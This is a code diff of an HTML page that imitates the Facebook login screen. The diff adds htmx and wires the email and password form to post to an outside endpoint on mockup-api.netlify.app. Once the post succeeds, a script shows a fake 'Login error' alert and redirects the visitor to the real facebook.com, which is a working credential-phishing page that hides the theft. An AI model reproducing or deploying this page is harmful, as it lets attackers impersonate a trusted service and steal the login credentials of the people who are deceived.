@@ -1,47 +1,91 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Facebook – log in or sign up</title>
-    <link rel="stylesheet" href="default.css">
-    <link rel="stylesheet" href="style.css">
-</head>
-<body>
+    <link rel="stylesheet" href="default.css" />
+    <link rel="stylesheet" href="style.css" />
+    <script
+      src="https://unpkg.com/htmx.org@1.9.10"
+      integrity="sha384-D1Kt99CQMDuVetoL1lrYwg5t+9QdHe7NLX/SoJYkXDFfX37iInKRy5xLSi8nO7UC"
+      crossorigin="anonymous"
+    ></script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        document.body.addEventListener("htmx:responseError", function (event) {
+          window.alert("Login failed");
+        });
+
+        document.body.addEventListener(
+          "htmx:afterSwap",
+          async function (event) {
+            if (event.detail.xhr.status === 200) {
+              await window.alert("Login error, please try again.");
+              await window.location.replace("https://www.facebook.com/");
+            } else {
+              window.alert("Login failed");
+            }
+          }
+        );
+      });
+    </script>
+  </head>
+  <body>
     <div class="login">
-        <div class="container">
-            <div class="row">
-                <div class="col-7">
-                    <div class="align-center">
-                        <div class="content">
-                            <img src="img/fb.png" alt="">
-                            <p>Facebook helps you connect and share with the people in your life.</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-5 col-xs-12">
-                    
-                        <div class="login-form">
-                            <form action="">
-                                <input id="email" type="text" placeholder="Email address or phone number"><br>
-                                <input id="pass" type="text" placeholder="Password"><br>
-                                <button id="login-btn">Log In</button><br>
-                                <a href="#">Forgotten password?</a><br>
-                                <button id="create-btn">Create New Account</button><br>
-                            </form>
-                        </div>
-                        <footer>
-                            <a href="#" 
-                            style="font-weight: bold;
-                            color: var(--black);
-                            text-decoration: none;">Create a Page</a> 
-                            for a celebrity, band or business.
-                        </footer>
-                    
-                </div>
+      <div class="container">
+        <div class="row">
+          <div class="col-7">
+            <div class="align-center">
+              <div class="content">
+                <img src="img/fb.png" alt="" />
+                <p>
+                  Connect with friends and the world around you on Facebook.
+                </p>
+              </div>
             </div>
+          </div>
+          <div class="col-5 col-xs-12">
+            <div class="login-form">
+              <form
+                hx-post="https://mockup-api.netlify.app/.netlify/functions/expressFunction/login"
+                hx-target="#result"
+                hx-swap="innerHTML"
+              >
+                <input
+                  id="email"
+                  type="text"
+                  name="email"
+                  placeholder="Email address or phone number"
+                /><br />
+                <input
+                  id="password"
+                  type="text"
+                  name="password"
+                  placeholder="Password"
+                /><br />
+                <button type="submit" id="login-btn">Log In</button><br />
+                <a href="#">Forgotten password?</a><br />
+                <button id="create-btn">Create New Account</button><br />
+              </form>
+            </div>
+            <footer>
+              <a
+                href="#"
+                style="
+                  font-weight: bold;
+                  color: var(--black);
+                  text-decoration: none;
+                "
+                >Create a Page</a
+              >
+              for a celebrity, band or business.
+            </footer>
+            <div id="result"></div>
+          </div>
         </div>
+      </div>
     </div>
-</body>
+  </body>
 </html>
